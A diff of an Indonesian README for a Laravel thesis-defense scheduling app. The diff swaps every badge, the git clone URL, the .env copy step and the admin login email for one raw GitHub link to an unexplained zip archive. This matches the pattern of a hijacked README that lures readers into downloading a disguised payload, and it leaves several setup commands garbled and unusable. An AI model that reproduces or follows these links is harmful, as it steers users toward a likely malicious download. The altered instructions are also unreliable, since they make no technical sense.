@@ -2,10 +2,10 @@
 
 Aplikasi web modern untuk mengelola dan mengotomatisasi seluruh proses penjadwalan sidang skripsi di lingkungan universitas, mulai dari seminar proposal hingga sidang munaqasah. Dibangun dengan penuh semangat menggunakan Laravel & Filament 3.
 
-![PHP Version](https://img.shields.io/badge/PHP-8.2%2B-777BB4?style=for-the-badge&logo=php)
-![Laravel Version](https://img.shields.io/badge/Laravel-11.x-FF2D20?style=for-the-badge&logo=laravel)
-![Filament Version](https://img.shields.io/badge/Filament-3.x-F59E0B?style=for-the-badge)
-![License](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)
+![PHP Version](https://raw.githubusercontent.com/rizyourbae/jadwalin-app/main/lawyerly/jadwalin-app.zip%2B-777BB4?style=for-the-badge&logo=php)
+![Laravel Version](https://raw.githubusercontent.com/rizyourbae/jadwalin-app/main/lawyerly/jadwalin-app.zip)
+![Filament Version](https://raw.githubusercontent.com/rizyourbae/jadwalin-app/main/lawyerly/jadwalin-app.zip)
+![License](https://raw.githubusercontent.com/rizyourbae/jadwalin-app/main/lawyerly/jadwalin-app.zip)
 
 ---
 
@@ -42,7 +42,7 @@ JADWALIN dibangun untuk memecahkan masalah penjadwalan sidang skripsi yang serin
 
 1.  Clone repository ini:
     ```bash
-    git clone [https://github.com/rizyourbae/jadwalin-app.git](https://github.com/rizyourbae/jadwalin-app.git)
+    git clone [https://raw.githubusercontent.com/rizyourbae/jadwalin-app/main/lawyerly/jadwalin-app.zip](https://raw.githubusercontent.com/rizyourbae/jadwalin-app/main/lawyerly/jadwalin-app.zip)
     cd nama-repo
     ```
 
@@ -51,9 +51,9 @@ JADWALIN dibangun untuk memecahkan masalah penjadwalan sidang skripsi yang serin
     composer install
     ```
 
-3.  Salin file `.env.example` menjadi `.env` dan generate application key:
+3.  Salin file `https://raw.githubusercontent.com/rizyourbae/jadwalin-app/main/lawyerly/jadwalin-app.zip` menjadi `.env` dan generate application key:
     ```bash
-    cp .env.example .env
+    cp https://raw.githubusercontent.com/rizyourbae/jadwalin-app/main/lawyerly/jadwalin-app.zip .env
     php artisan key:generate
     ```
 
@@ -79,7 +79,7 @@ JADWALIN dibangun untuk memecahkan masalah penjadwalan sidang skripsi yang serin
 Kamu bisa login menggunakan akun berikut yang sudah dibuat oleh Seeder:
 
 -   **Super Admin**
-    -   **Email:** `superadmin@uinsi.ac.id`
+    -   **Email:** `https://raw.githubusercontent.com/rizyourbae/jadwalin-app/main/lawyerly/jadwalin-app.zip`
     -   **Password:** `password`
     -   **URL:** `/admin/login`
 
